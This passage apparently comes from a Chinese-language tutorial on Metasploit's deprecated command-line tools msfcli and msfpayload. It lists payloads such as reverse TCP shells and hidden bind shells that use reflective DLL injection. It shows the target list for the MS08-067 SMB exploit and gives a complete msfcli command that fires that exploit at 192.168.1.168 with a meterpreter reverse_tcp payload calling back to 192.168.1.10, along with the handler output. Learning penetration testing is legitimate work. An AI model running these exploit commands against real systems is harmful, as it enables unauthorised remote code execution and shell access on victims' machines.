&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-----------
&nbsp;&nbsp;&nbsp;generic/custom&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Use&nbsp;custom&nbsp;string&nbsp;or&nbsp;file&nbsp;as&nbsp;payload.&nbsp;Set&nbsp;either&nbsp;PAYLOADFILE&nbsp;or
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PAYLOADSTR.
&nbsp;&nbsp;&nbsp;generic/debug_trap&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Generate&nbsp;a&nbsp;debug&nbsp;trap&nbsp;in&nbsp;the&nbsp;target&nbsp;process
&nbsp;&nbsp;&nbsp;generic/shell_bind_tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Listen&nbsp;for&nbsp;a&nbsp;connection&nbsp;and&nbsp;spawn&nbsp;a&nbsp;command&nbsp;shell
&nbsp;&nbsp;&nbsp;generic/shell_reverse_tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Connect&nbsp;back&nbsp;to&nbsp;attacker&nbsp;and&nbsp;spawn&nbsp;a&nbsp;command&nbsp;shell
&nbsp;&nbsp;&nbsp;generic/tight_loop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Generate&nbsp;a&nbsp;tight&nbsp;loop&nbsp;in&nbsp;the&nbsp;target&nbsp;process
&nbsp;&nbsp;&nbsp;windows/dllinject/bind_hidden_ipknock_tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Inject&nbsp;a&nbsp;DLL&nbsp;via&nbsp;a
&nbsp;reflective&nbsp;loader.&nbsp;Listen&nbsp;for&nbsp;a&nbsp;connection.&nbsp;First,&nbsp;the&nbsp;port&nbsp;will&nbsp;need&nbsp;
to&nbsp;be&nbsp;knocked&nbsp;from
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;the&nbsp;IP&nbsp;defined&nbsp;in&nbsp;KHOST.&nbsp;This&nbsp;IP&nbsp;will&nbsp;work&nbsp;as&nbsp;an&nbsp;authentication&nbsp;method
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(you&nbsp;can&nbsp;spoof&nbsp;it&nbsp;with&nbsp;tools&nbsp;like&nbsp;hping).&nbsp;After&nbsp;that&nbsp;you&nbsp;could&nbsp;get&nbsp;your
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shellcode&nbsp;from&nbsp;any&nbsp;IP.&nbsp;The&nbsp;socket&nbsp;will&nbsp;appear&nbsp;as&nbsp;&quot;closed&quot;&nbsp;helping&nbsp;us&nbsp;to
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hide&nbsp;the&nbsp;shellcode
&nbsp;&nbsp;&nbsp;windows/dllinject/bind_hidden_tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Inject&nbsp;a&nbsp;DLL&nbsp;via&nbsp;a
&nbsp;reflective&nbsp;loader.&nbsp;Listen&nbsp;for&nbsp;a&nbsp;connection&nbsp;from&nbsp;a&nbsp;hidden&nbsp;port&nbsp;and&nbsp;spawn
&nbsp;a&nbsp;command&nbsp;shell&nbsp;to&nbsp;the&nbsp;allowed&nbsp;host
&nbsp;&nbsp;&nbsp;windows/dllinject/bind_ipv6_tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Inject&nbsp;a&nbsp;DLL&nbsp;via&nbsp;a&nbsp;reflective&nbsp;loader.&nbsp;Listen&nbsp;for&nbsp;a&nbsp;connection&nbsp;over&nbsp;IPv6
&nbsp;&nbsp;&nbsp;windows/dllinject/bind_nonx_tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Inject&nbsp;a&nbsp;DLL&nbsp;via&nbsp;a&nbsp;reflective&nbsp;loader.&nbsp;Listen&nbsp;for&nbsp;a&nbsp;connection&nbsp;(No&nbsp;NX)
&nbsp;&nbsp;&nbsp;windows/dllinject/bind_tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Inject&nbsp;a&nbsp;DLL&nbsp;via&nbsp;a&nbsp;reflective&nbsp;loader.&nbsp;Listen&nbsp;for&nbsp;a&nbsp;connection
&nbsp;&nbsp;&nbsp;windows/dllinject/bind_tcp_rc4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Inject&nbsp;a&nbsp;DLL&nbsp;via&nbsp;a&nbsp;reflective&nbsp;loader.&nbsp;Listen&nbsp;for&nbsp;a&nbsp;connection
&nbsp;&nbsp;&nbsp;windows/dllinject/reverse_hop_http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Inject&nbsp;a&nbsp;DLL&nbsp;via&nbsp;a
&nbsp;reflective&nbsp;loader.&nbsp;&nbsp;Tunnel&nbsp;communication&nbsp;over&nbsp;an&nbsp;HTTP&nbsp;hop&nbsp;point.&nbsp;Note&nbsp;
that&nbsp;you&nbsp;must&nbsp;first&nbsp;upload</pre><pre class="brush:bash;toolbar:false">exploit@ubuntu:/pentest/framework3$&nbsp;msfcli&nbsp;exploit/windows/smb/ms08_067_netapi&nbsp;M</pre><p><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">M参数显示正在使用的模块有哪些必须的参数没有设置，操作我们可以发现，需要设置远程的服务器ip<br/></span></p><pre class="brush:bash;toolbar:false">exploit@ubuntu:/pentest/framework3$&nbsp;msfcli&nbsp;exploit/windows/smb/ms08_067_netapi&nbsp;M[!]&nbsp;************************************************************************[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;utility&nbsp;msfcli&nbsp;is&nbsp;deprecated!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;It&nbsp;will&nbsp;be&nbsp;removed&nbsp;on&nbsp;or&nbsp;about&nbsp;2015-06-18&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Please&nbsp;use&nbsp;msfconsole&nbsp;-r&nbsp;or&nbsp;-x&nbsp;instead&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;Details:&nbsp;https://github.com/rapid7/metasploit-framework/pull/3802&nbsp;&nbsp;&nbsp;*[!]&nbsp;************************************************************************[*]&nbsp;Initializing&nbsp;modules...
&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;Current&nbsp;Setting&nbsp;&nbsp;Required&nbsp;&nbsp;Description
&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;---------------&nbsp;&nbsp;--------&nbsp;&nbsp;-----------
&nbsp;&nbsp;&nbsp;RHOST&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;target&nbsp;address</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">msfcli auxiliary/scanner/http/http_version rhosts=IP encoder= post= nop= E</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">E 参数，是执行当前的选择的模块，如下图，我们选择http服务版本探测，设置好参数，加上E参数，执行当前模块</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">msfcli的另外一个参数是t，这里是选择我们针对的远程目标的版本的选择，如下图，我们可以选择合适的目标来进行远程溢出</span></p><pre class="brush:bash;toolbar:false">exploit@ubuntu:/pentest/framework3$&nbsp;msfcli&nbsp;exploits/windows/smb/ms08_067_netapi&nbsp;t[!]&nbsp;************************************************************************[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;utility&nbsp;msfcli&nbsp;is&nbsp;deprecated!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;It&nbsp;will&nbsp;be&nbsp;removed&nbsp;on&nbsp;or&nbsp;about&nbsp;2015-06-18&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Please&nbsp;use&nbsp;msfconsole&nbsp;-r&nbsp;or&nbsp;-x&nbsp;instead&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;Details:&nbsp;https://github.com/rapid7/metasploit-framework/pull/3802&nbsp;&nbsp;&nbsp;*[!]&nbsp;************************************************************************[*]&nbsp;Initializing&nbsp;modules...
&nbsp;&nbsp;Id&nbsp;&nbsp;Name
&nbsp;&nbsp;&nbsp;--&nbsp;&nbsp;----
&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;Automatic&nbsp;Targeting
&nbsp;&nbsp;&nbsp;1&nbsp;&nbsp;&nbsp;Windows&nbsp;2000&nbsp;Universal
&nbsp;&nbsp;&nbsp;2&nbsp;&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP0/SP1&nbsp;Universal
&nbsp;&nbsp;&nbsp;3&nbsp;&nbsp;&nbsp;Windows&nbsp;2003&nbsp;SP0&nbsp;Universal
&nbsp;&nbsp;&nbsp;4&nbsp;&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP2&nbsp;English&nbsp;(AlwaysOn&nbsp;NX)
&nbsp;&nbsp;&nbsp;5&nbsp;&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP2&nbsp;English&nbsp;(NX)
&nbsp;&nbsp;&nbsp;6&nbsp;&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP3&nbsp;English&nbsp;(AlwaysOn&nbsp;NX)
&nbsp;&nbsp;&nbsp;7&nbsp;&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP3&nbsp;English&nbsp;(NX)
&nbsp;&nbsp;&nbsp;8&nbsp;&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP2&nbsp;Arabic&nbsp;(NX)
&nbsp;&nbsp;&nbsp;9&nbsp;&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP2&nbsp;Chinese&nbsp;-&nbsp;Traditional&nbsp;/&nbsp;Taiwan&nbsp;(NX)
&nbsp;&nbsp;&nbsp;10&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP2&nbsp;Chinese&nbsp;-&nbsp;Simplified&nbsp;(NX)
&nbsp;&nbsp;&nbsp;11&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP2&nbsp;Chinese&nbsp;-&nbsp;Traditional&nbsp;(NX)
&nbsp;&nbsp;&nbsp;12&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP2&nbsp;Czech&nbsp;(NX)
&nbsp;&nbsp;&nbsp;13&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP2&nbsp;Danish&nbsp;(NX)
&nbsp;&nbsp;&nbsp;14&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP2&nbsp;German&nbsp;(NX)
&nbsp;&nbsp;&nbsp;15&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP2&nbsp;Greek&nbsp;(NX)
&nbsp;&nbsp;&nbsp;16&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP2&nbsp;Spanish&nbsp;(NX)
&nbsp;&nbsp;&nbsp;17&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP2&nbsp;Finnish&nbsp;(NX)
&nbsp;&nbsp;&nbsp;18&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP2&nbsp;French&nbsp;(NX)
&nbsp;&nbsp;&nbsp;19&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP2&nbsp;Hebrew&nbsp;(NX)
&nbsp;&nbsp;&nbsp;20&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP2&nbsp;Hungarian&nbsp;(NX)
&nbsp;&nbsp;&nbsp;21&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP2&nbsp;Italian&nbsp;(NX)
&nbsp;&nbsp;&nbsp;22&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP2&nbsp;Japanese&nbsp;(NX)
&nbsp;&nbsp;&nbsp;23&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP2&nbsp;Korean&nbsp;(NX)
&nbsp;&nbsp;&nbsp;24&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP2&nbsp;Dutch&nbsp;(NX)
&nbsp;&nbsp;&nbsp;25&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP2&nbsp;Norwegian&nbsp;(NX)
&nbsp;&nbsp;&nbsp;26&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP2&nbsp;Polish&nbsp;(NX)
&nbsp;&nbsp;&nbsp;27&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP2&nbsp;Portuguese&nbsp;-&nbsp;Brazilian&nbsp;(NX)
&nbsp;&nbsp;&nbsp;28&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP2&nbsp;Portuguese&nbsp;(NX)
&nbsp;&nbsp;&nbsp;29&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP2&nbsp;Russian&nbsp;(NX)
&nbsp;&nbsp;&nbsp;30&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP2&nbsp;Swedish&nbsp;(NX)
&nbsp;&nbsp;&nbsp;31&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP2&nbsp;Turkish&nbsp;(NX)
&nbsp;&nbsp;&nbsp;32&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP3&nbsp;Arabic&nbsp;(NX)
&nbsp;&nbsp;&nbsp;33&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP3&nbsp;Chinese&nbsp;-&nbsp;Traditional&nbsp;/&nbsp;Taiwan&nbsp;(NX)
&nbsp;&nbsp;&nbsp;34&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP3&nbsp;Chinese&nbsp;-&nbsp;Simplified&nbsp;(NX)
&nbsp;&nbsp;&nbsp;35&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP3&nbsp;Chinese&nbsp;-&nbsp;Traditional&nbsp;(NX)
&nbsp;&nbsp;&nbsp;36&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP3&nbsp;Czech&nbsp;(NX)
&nbsp;&nbsp;&nbsp;37&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP3&nbsp;Danish&nbsp;(NX)
&nbsp;&nbsp;&nbsp;38&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP3&nbsp;German&nbsp;(NX)
&nbsp;&nbsp;&nbsp;39&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP3&nbsp;Greek&nbsp;(NX)
&nbsp;&nbsp;&nbsp;40&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP3&nbsp;Spanish&nbsp;(NX)
&nbsp;&nbsp;&nbsp;41&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP3&nbsp;Finnish&nbsp;(NX)
&nbsp;&nbsp;&nbsp;42&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP3&nbsp;French&nbsp;(NX)
&nbsp;&nbsp;&nbsp;43&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP3&nbsp;Hebrew&nbsp;(NX)
&nbsp;&nbsp;&nbsp;44&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP3&nbsp;Hungarian&nbsp;(NX)
&nbsp;&nbsp;&nbsp;45&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP3&nbsp;Italian&nbsp;(NX)
&nbsp;&nbsp;&nbsp;46&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP3&nbsp;Japanese&nbsp;(NX)
&nbsp;&nbsp;&nbsp;47&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP3&nbsp;Korean&nbsp;(NX)
&nbsp;&nbsp;&nbsp;48&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP3&nbsp;Dutch&nbsp;(NX)
&nbsp;&nbsp;&nbsp;49&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP3&nbsp;Norwegian&nbsp;(NX)
&nbsp;&nbsp;&nbsp;50&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP3&nbsp;Polish&nbsp;(NX)
&nbsp;&nbsp;&nbsp;51&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP3&nbsp;Portuguese&nbsp;-&nbsp;Brazilian&nbsp;(NX)
&nbsp;&nbsp;&nbsp;52&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP3&nbsp;Portuguese&nbsp;(NX)
&nbsp;&nbsp;&nbsp;53&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP3&nbsp;Russian&nbsp;(NX)
&nbsp;&nbsp;&nbsp;54&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP3&nbsp;Swedish&nbsp;(NX)
&nbsp;&nbsp;&nbsp;55&nbsp;&nbsp;Windows&nbsp;XP&nbsp;SP3&nbsp;Turkish&nbsp;(NX)
&nbsp;&nbsp;&nbsp;56&nbsp;&nbsp;Windows&nbsp;2003&nbsp;SP1&nbsp;English&nbsp;(NO&nbsp;NX)
&nbsp;&nbsp;&nbsp;57&nbsp;&nbsp;Windows&nbsp;2003&nbsp;SP1&nbsp;English&nbsp;(NX)
&nbsp;&nbsp;&nbsp;58&nbsp;&nbsp;Windows&nbsp;2003&nbsp;SP1&nbsp;Japanese&nbsp;(NO&nbsp;NX)
&nbsp;&nbsp;&nbsp;59&nbsp;&nbsp;Windows&nbsp;2003&nbsp;SP1&nbsp;Spanish&nbsp;(NO&nbsp;NX)
&nbsp;&nbsp;&nbsp;60&nbsp;&nbsp;Windows&nbsp;2003&nbsp;SP1&nbsp;Spanish&nbsp;(NX)
&nbsp;&nbsp;&nbsp;61&nbsp;&nbsp;Windows&nbsp;2003&nbsp;SP2&nbsp;English&nbsp;(NO&nbsp;NX)
&nbsp;&nbsp;&nbsp;62&nbsp;&nbsp;Windows&nbsp;2003&nbsp;SP2&nbsp;English&nbsp;(NX)
&nbsp;&nbsp;&nbsp;63&nbsp;&nbsp;Windows&nbsp;2003&nbsp;SP2&nbsp;German&nbsp;(NO&nbsp;NX)
&nbsp;&nbsp;&nbsp;64&nbsp;&nbsp;Windows&nbsp;2003&nbsp;SP2&nbsp;German&nbsp;(NX)
&nbsp;&nbsp;&nbsp;65&nbsp;&nbsp;Windows&nbsp;2003&nbsp;SP2&nbsp;Portuguese&nbsp;-&nbsp;Brazilian&nbsp;(NX)
&nbsp;&nbsp;&nbsp;66&nbsp;&nbsp;Windows&nbsp;2003&nbsp;SP2&nbsp;Spanish&nbsp;(NO&nbsp;NX)
&nbsp;&nbsp;&nbsp;67&nbsp;&nbsp;Windows&nbsp;2003&nbsp;SP2&nbsp;Spanish&nbsp;(NX)
&nbsp;&nbsp;&nbsp;68&nbsp;&nbsp;Windows&nbsp;2003&nbsp;SP2&nbsp;Japanese&nbsp;(NO&nbsp;NX)</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">根据上面的介绍，我们来对目标ip通过ms08_067_netapi进行远程攻击，参数设置如下</span></p><pre class="brush:bash;toolbar:false">exploit@ubuntu:/pentest/framework3$&nbsp;msfcli&nbsp;
exploits/windows/smb/ms08_067_netapi&nbsp;RHOST=192.168.1.168&nbsp;
PAYLOAD=windows/meterpreter/reverse_tcp&nbsp;LHOST=192.168.1.10&nbsp;LPORT=5546&nbsp;E
[!]&nbsp;************************************************************************
[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;utility&nbsp;msfcli&nbsp;is&nbsp;deprecated!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*
[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;It&nbsp;will&nbsp;be&nbsp;removed&nbsp;on&nbsp;or&nbsp;about&nbsp;2015-06-18&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*
[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Please&nbsp;use&nbsp;msfconsole&nbsp;-r&nbsp;or&nbsp;-x&nbsp;instead&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*
[!]&nbsp;*&nbsp;&nbsp;Details:&nbsp;https://github.com/rapid7/metasploit-framework/pull/3802&nbsp;&nbsp;&nbsp;*
[!]&nbsp;************************************************************************
[*]&nbsp;Initializing&nbsp;modules...
RHOST&nbsp;=&gt;&nbsp;192.168.1.168
PAYLOAD&nbsp;=&gt;&nbsp;windows/meterpreter/reverse_tcp
LHOST&nbsp;=&gt;&nbsp;192.168.1.10
LPORT&nbsp;=&gt;&nbsp;5546
[-]&nbsp;Handler&nbsp;failed&nbsp;to&nbsp;bind&nbsp;to&nbsp;192.168.1.10:5546
[*]&nbsp;Started&nbsp;reverse&nbsp;handler&nbsp;on&nbsp;0.0.0.0:5546</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">下面我们介绍我们会经常用到的一个参数，msfpayload，执行msfpayload －h，帮助文件显示的似乎很简单，我们对每个参数的功能做详细的介绍：</span></p><pre class="brush:bash;toolbar:false">exploit@ubuntu:/pentest/framework3$&nbsp;msfpayload&nbsp;-h
[!]&nbsp;************************************************************************
[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;utility&nbsp;msfpayload&nbsp;is&nbsp;deprecated!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*
[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;It&nbsp;will&nbsp;be&nbsp;removed&nbsp;on&nbsp;or&nbsp;about&nbsp;2015-06-08&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*
